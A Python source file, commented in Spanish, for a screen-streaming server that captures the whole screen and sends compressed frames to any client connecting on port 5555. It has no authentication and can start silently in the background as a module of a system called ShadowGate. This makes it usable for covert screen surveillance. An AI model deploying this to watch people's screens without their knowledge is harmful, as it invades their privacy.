#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import zlib
import pickle
import struct
import cv2
import numpy as np
from PIL import ImageGrab
import io
import time
import sys
import os
from cryptography.fernet import Fernet


class ScreenServer:
    def __init__(self, host='0.0.0.0', port=5555, encryption_key=None):
        self.host = host
        self.port = port
        self.quality = 50  # Calidad JPEG (1-100)
        self.resolution = (1920, 1080)  # Resolución máxima
        self.running = False
        self.clients = {}

        # Configuración de cifrado
        if encryption_key:
            self.cipher = Fernet(encryption_key)
        else:
            self.cipher = None

    def capture_screen(self):
        """Capturar la pantalla y comprimir la imagen"""
        try:
            # Capturar pantalla completa
            screen = ImageGrab.grab()

            # Redimensionar si es necesario
            if screen.size != self.resolution:
                screen = screen.resize(self.resolution)

            # Convertir a formato OpenCV
            frame = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)

            # Comprimir imagen
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
            result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)

            if result:
                # Comprimir aún más con zlib
                compressed_frame = zlib.compress(encoded_frame)
                return compressed_frame
            return None

        except Exception as e:
            print(f"Error capturando pantalla: {e}")
            return None

    def encrypt_data(self, data):
        """Cifrar datos si hay clave configurada"""
        if self.cipher:
            return self.cipher.encrypt(data)
        return data

    def handle_client(self, client_socket, address):
        """Manejar conexión de cliente individual"""
        print(f"Conexión establecida desde {address}")
        self.clients[address] = client_socket

        try:
            while self.running:
                # Capturar pantalla
                frame_data = self.capture_screen()

                if frame_data:
                    # Cifrar si es necesario
                    encrypted_data = self.encrypt_data(frame_data)

                    # Enviar tamaño del frame primero
                    size = struct.pack('!I', len(encrypted_data))
                    client_socket.sendall(size)

                    # Enviar frame comprimido
                    client_socket.sendall(encrypted_data)

                # Controlar FPS (máximo 10 FPS para no saturar)
                time.sleep(0.1)

        except (ConnectionResetError, BrokenPipeError):
            print(f"Conexión cerrada por {address}")
        except Exception as e:
            print(f"Error con cliente {address}: {e}")
        finally:
            client_socket.close()
            if address in self.clients:
                del self.clients[address]

    def start_server(self):
        """Iniciar servidor de transmisión de pantalla"""
        self.running = True

        # Crear socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            print(f"Servidor de pantalla iniciado en {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = server_socket.accept()

                    # Manejar cliente en hilo separado
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except Exception as e:
                    print(f"Error aceptando conexión: {e}")

        except Exception as e:
            print(f"Error iniciando servidor: {e}")
        finally:
            server_socket.close()
            self.running = False

    def stop_server(self):
        """Detener servidor"""
        self.running = False
        for client in self.clients.values():
            try:
                client.close()
            except:
                pass
        self.clients.clear()


# Función para integrar con el sistema principal
def integrate_with_shadowgate(config):
    """Integrar el servidor de pantalla con ShadowGate"""
    server = ScreenServer(
        host=config.get('screen_host', '0.0.0.0'),
        port=config.get('screen_port', 5555),
        encryption_key=config.get('encryption_key')
    )

    # Iniciar en segundo plano
    screen_thread = threading.Thread(
        target=server.start_server,
        daemon=True
    )
    screen_thread.start()

    return server


if __name__ == "__main__":
    # Ejecución independiente para pruebas
    server = ScreenServer()
    try:
        server.start_server()
    except KeyboardInterrupt:
        server.stop_server()